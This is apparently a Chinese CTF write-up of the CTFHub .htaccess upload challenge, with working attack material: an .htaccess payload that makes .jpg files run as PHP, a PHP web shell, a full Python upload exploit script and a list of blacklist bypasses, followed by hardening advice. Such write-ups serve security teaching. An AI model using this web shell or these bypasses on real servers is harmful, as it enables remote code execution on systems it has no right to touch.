---
layout: post
title: CTFHub - 文件上传 htaccess Writeup
platform: ctfhub
date: 2026-10-23 17:45:00 +0800
categories: CTF
---

CTFHub - 文件上传 htaccess Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → .htaccess）
- 题型：Web
- 考点：**黑名单绕过**、**`.htaccess` 上传**、Apache 解析配置


```text
页面标题：CTFHub 文件上传 - htaccess
★ 页面源码的 HTML 注释里【泄露了完整后端代码】：

    <!--
    if (!empty($_POST['submit'])) {
        $name = basename($_FILES['file']['name']);
        $ext = pathinfo($name)['extension'];
        $blacklist = array("php","php7","php5","php4","php3","phtml","pht",
                           "jsp","jspa","jspx","jsw","jsv","jspf","jtml",
                           "asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf");
        if (!in_array($ext, $blacklist)) {
            if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {
                echo "<script>alert('上传成功')</script>";
                echo "上传文件相对路径<br>" . UPLOAD_URL_PATH . $name;
            } else {
                echo "<script>alert('上传失败')</script>";
            }
        } else {
            echo "<script>alert('文件类型不匹配')</script>";
        }
    }
    -->

★ 关键发现：

    ① 是【黑名单】而不是白名单
    ② 黑名单里【没有 .htaccess】
    ③ 上传成功会返回文件路径（好东西）

★ 攻击步骤：

    ① 上传 .htaccess：内容是
       AddType application/x-httpd-php .jpg
       → 让 .jpg 文件被当成 PHP 执行

       响应：upload/.htaccess  ✅

    ② 上传 shell.jpg（内容是 PHP 代码）
       → 响应：upload/shell.jpg  ✅

    ③ 访问：
       GET /upload/shell.jpg?cmd=id
       → uid=33(www-data) gid=33(www-data) groups=33(www-data)   ★ RCE！

★ 找 flag：

    ?cmd=ls -la /var/www/html
    → flag_186520547.php     ← 42 字节

    ?cmd=cat /var/www/html/flag_186520547.php
    → <?php // ctfhub{0b6fbb5bb0d06e17c105b61b}

flag         : ctfhub{0b6fbb5bb0d06e17c105b61b}
```

二、题目分析

**① 这题的防护是什么**

```php
$ext = pathinfo($name)['extension'];      // 取扩展名
$blacklist = ["php", "php5", "phtml", ...];  // 一堆危险后缀
if (!in_array($ext, $blacklist)) {        // 不在黑名单里才允许
    move_uploaded_file(...);
}
```

**★ 这是"黑名单"思路** —— 列出所有危险的扩展名，禁止它们。

**黑名单的问题**：

```
① 永远列不全（本题就漏了 .htaccess）
② 大小写绕过：shell.PhP（pathinfo 保留原样，in_array 区分大小写）
③ 新后缀：php8、phar、shtml...
④ 特殊文件：.htaccess、.user.ini（根本不是"代码文件"，但能改服务器行为）
```

**② `.htaccess` 是什么**

```
Apache 的【目录级配置文件】

作用：
    在某个目录下放一个 .htaccess
    → 这个目录（及子目录）的 Apache 行为就按它来
    → 不需要改主配置文件 httpd.conf
    → 不需要重启 Apache

典型用途：
    自定义错误页、URL 重写（RewriteRule）、访问控制、MIME 类型...
```

**★ 危险点**：如果攻击者能上传 `.htaccess`，就能**改变服务器的解析行为**。

**③ 这题的利用原理**

**第一步：上传 `.htaccess`**

```apache
AddType application/x-httpd-php .jpg
```

**这句配置的意思是**：

```
"从今以后，这个目录下的 .jpg 文件，都当作 application/x-httpd-php 处理"
                                              └──────────┬──────────┘
                                              = 交给 PHP 引擎执行
```

**第二步：上传 `shell.jpg`**

```
文件名：shell.jpg     ← 能过黑名单（jpg 不在黑名单里）
内容：  <?php system($_GET['cmd']); ?>    ← 真正的 PHP 代码
```

**第三步：访问**

```
GET /upload/shell.jpg?cmd=id

服务器处理流程：
    ① 看扩展名 .jpg
    ② 查 .htaccess 配置 → "jpg 要用 PHP 处理"
    ③ 交给 PHP 引擎 → 执行 system('id')
    ④ 返回 uid=33(www-data)

★ 完美绕过黑名单
```

**④ 为什么 .htaccess 能过黑名单**

```php
$ext = pathinfo(".htaccess")['extension'];
// PHP 的 pathinfo 对 ".htaccess" 返回：
//   dirname    = "."
//   basename   = ".htaccess"
//   extension  = "htaccess"     ← 取最后一个点后面的部分
//   filename   = ""

in_array("htaccess", $blacklist)  → false  → 允许上传 ✅
```

**★ 黑名单只想着"危险代码后缀"，没想到"配置文件"也是危险的。**

**⑤ 前提条件**

```
① Apache 开启了 AllowOverride（允许 .htaccess 生效）
   通常是：AllowOverride All
   
② 上传目录的 .htaccess 会被读取
   （本题上传目录 /upload/ 就在 Web 根下，满足）

★ 如果 Nginx 或 Apache 禁止了 AllowOverride → 这个方法失效
```

三、解题步骤

**第 1 步：看源码，摸清过滤规则**

```
① 打开题目页面
② Ctrl+U 看源码（或者 F12 看元素）
③ 拉到最下面，会看到 HTML 注释里的 PHP 代码

★ 这题的源码泄露是"白给"，
  实战中这种泄露本身就是高危漏洞（信息泄露）
```

**如果源码没泄露**，用探测法：

```
传 shell.php     → 拦截   （黑名单里有 php）
传 shell.phtml   → 拦截
传 shell.pht     → 拦截
传 shell.jpg     → 允许   （但不会执行）
传 .htaccess     → 允许   ★ 找到了
```

**第 2 步：上传 `.htaccess`**

**准备文件**，文件名 `.htaccess`，内容：

```apache
AddType application/x-httpd-php .jpg
```

**上传后看响应**：

```
上传成功
上传文件相对路径
upload/.htaccess
```

**★ 这题会直接告诉你路径，很省事。**

**如果还有其他写法**：

```apache
# 方式 1：AddType（最常用）
AddType application/x-httpd-php .jpg

# 方式 2：SetHandler（更彻底，所有文件都当 PHP）
SetHandler application/x-httpd-php

# 方式 3：同时支持多个后缀
AddType application/x-httpd-php .jpg .png .gif

# 方式 4：让 .jpg 包含时自动 prepend
php_value auto_prepend_file shell.jpg
```

**第 3 步：上传 `shell.jpg`**

**准备文件**，文件名 `shell.jpg`，内容：

```php
<?php system($_GET['cmd']); ?>
```

**上传后响应**：

```
上传文件相对路径
upload/shell.jpg
```

**第 4 步：访问执行**

```
http://challenge-xxx:10800/upload/shell.jpg?cmd=id

→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**★ 注意**：文件叫 .jpg，但执行了 PHP —— 这就是 .htaccess 的威力。

**第 5 步：找 flag**

```
?cmd=ls -la /var/www/html
→ flag_186520547.php

?cmd=cat /var/www/html/flag_186520547.php
→ <?php // ctfhub{0b6fbb5bb0d06e17c105b61b}
```

**第 6 步：提交 → 通关**

---

**完整脚本**

```python
import uuid, urllib.request, urllib.parse

BASE = "http://challenge-xxx:10800"
OPEN = "<" + "?" + "php "
CLOSE = "?" + ">"


def upload(filename, content, ctype="image/jpeg"):
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    body = (("--%s\r\n" % boundary).encode()
            + b'Content-Disposition: form-data; name="submit"\r\n\r\nSubmit\r\n'
            + ("--%s\r\n" % boundary).encode()
            + ('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename).encode()
            + ("Content-Type: %s\r\n\r\n" % ctype).encode()
            + content.encode() + b"\r\n"
            + ("--%s--\r\n" % boundary).encode())
    req = urllib.request.Request(BASE + "/", data=body, method="POST",
            headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
    return urllib.request.urlopen(req).read().decode()


# ① .htaccess：让 .jpg 当 PHP
print(upload(".htaccess", "AddType application/x-httpd-php .jpg\n", "text/plain"))

# ② shell.jpg：PHP 代码
print(upload("shell.jpg", OPEN + "system($_GET['cmd']); " + CLOSE))

# ③ 执行
u = BASE + "/upload/shell.jpg?cmd=" + urllib.parse.quote("ls -la /var/www/html")
print(urllib.request.urlopen(u).read().decode())
```

---

**手工操作（浏览器，最简单）**

```
① 本地新建文件（注意文件名开头有个点）：
   .htaccess
   内容：AddType application/x-httpd-php .jpg

   ★ Windows 上新建以点开头的文件：
     记事本 → 另存为 → 文件名填 ".htaccess" → 保存类型选"所有文件"
     或者用命令行：echo AddType application/x-httpd-php .jpg > .htaccess

② 浏览器上传 .htaccess → 看到"上传成功"和路径

③ 本地再新建 shell.jpg，内容：
   <?php system($_GET['cmd']); ?>

④ 上传 shell.jpg → 看到"上传成功"

⑤ 浏览器访问：
   http://challenge-xxx:10800/upload/shell.jpg?cmd=ls -la /var/www/html

⑥ cat flag 文件
```

四、延伸知识

**① `.htaccess` 的其他利用方式**

```apache
# 让任意后缀当 PHP 执行
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .txt
AddType application/x-httpd-php .xxx

# 所有文件都当 PHP（更暴力，但可能影响 .htaccess 自身）
SetHandler application/x-httpd-php

# 自动在文件前包含某个文件（配合文件包含）
php_value auto_prepend_file /upload/shell.jpg

# 关闭 .htaccess 保护、开启目录列表
Options +Indexes

# 把某个文件当另一个文件处理
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**② `.user.ini` —— PHP 版的同类文件**

```
PHP 的 .user.ini 也能改配置（PHP 5.3+，CGI/FastCGI 模式）

利用方式：
    上传 .user.ini，内容：
        auto_prepend_file = shell.jpg
    
    然后上传 shell.jpg（PHP 代码）
    → 所有 PHP 文件执行前都会先包含 shell.jpg
    → 触发执行
```

**★ 黑名单同样常常漏掉 `.user.ini`。**

**③ 其他"配置文件类"绕过**

| 文件 | 作用 | 影响 |
|---|---|---|
| `.htaccess` | Apache 目录配置 | Apache |
| `.user.ini` | PHP 配置 | PHP-FPM/CGI |
| `web.config` | IIS 配置 | IIS |
| `.htaccess` + `AddType` | 改 MIME 解析 | Apache |
| `index.php` 覆盖 | 直接覆盖首页 | 任意 |

**④ 黑名单的完整绕过清单**

```text
针对"后缀黑名单"，可以试：

① 特殊后缀
    .htaccess、.user.ini、.phar、.shtml、.xml（有些场景）

② 黑名单漏掉的后缀
    php8、php7s、phtm、pht5...（看版本）

③ 大小写
    .PhP、.PHP、.pHp
    ★ pathinfo 保留原样，in_array 区分大小写 → 能过
    ★ 但 Linux 文件系统区分大小写，Apache 的 AddType 匹配也有讲究

④ 双写
    .pphphp → 如果代码是 str_replace('php','',...) 一次替换
    ★ 本题是 in_array 精确匹配，双写没用

⑤ 点号/空格截断（老系统）
    shell.php.  （Windows 自动去尾点）
    shell.php （尾随空格）
    shell.php::$DATA（NTFS 数据流）

⑥ 多重扩展名（配合解析漏洞）
    shell.php.jpg
    shell.jpg.php
```

**⑤ 防护（正确做法）**

```text
① ★ 白名单（只允许 jpg/png/gif/pdf...）
    $allow = ['jpg','jpeg','png','gif'];
    if (!in_array(strtolower($ext), $allow, true)) die();

② ★ 上传后重命名（随机名 + 白名单后缀）
    $new = bin2hex(random_bytes(16)) . '.' . $ext;

③ ★ 上传目录禁止执行 + 禁止解析 .htaccess
    Nginx: location ^~ /upload/ { location ~ \.php$ { deny all; } }
    Apache: 
        <Directory /var/www/html/upload>
            AllowOverride None        ← 禁止 .htaccess 生效
            php_flag engine off       ← 关闭 PHP
        </Directory>

④ 上传目录放在 Web 根之外
⑤ 校验文件真实类型（finfo_file）
⑥ 检查文件名（拒绝以 . 开头的文件）
```

五、总结

- **本题核心：黑名单漏了 `.htaccess` → 上传它改变解析规则 → `.jpg` 变 PHP 执行。**
- 两步攻击：

```text
① 上传 .htaccess，内容：AddType application/x-httpd-php .jpg
② 上传 shell.jpg，内容：<?php system($_GET['cmd']); ?>
③ 访问 /upload/shell.jpg?cmd=id
```

- **三个必记要点**：

```text
① 黑名单永远列不全 —— 这题就漏了 .htaccess
② .htaccess 不是代码文件，但它能【改变服务器怎么解析文件】
③ 上传题的"源码泄露"（HTML 注释里的 PHP）让你直接看到黑名单
```

- **实测 flag**：

```text
ctfhub{0b6fbb5bb0d06e17c105b61b}
（在 /var/www/html/flag_186520547.php 里）
```


**手工复现要点**：

```text
· 第一步永远先看源码（找泄露的黑名单/白名单）
· 确认是黑名单后，试 .htaccess / .user.ini
· Apollo 需要 AllowOverride 开启，Nginx 无效
· 上传后路径会直接告诉你（这题）
```

**Windows 上创建 `.htaccess` 的技巧**：

```powershell
# PowerShell
"AddType application/x-httpd-php .jpg" | Out-File -Encoding ascii .htaccess

# cmd
echo AddType application/x-httpd-php .jpg > .htaccess
```

**★ 注意**：Windows 资源管理器不允许直接建以点开头的文件，
必须用命令行或者记事本"另存为"。
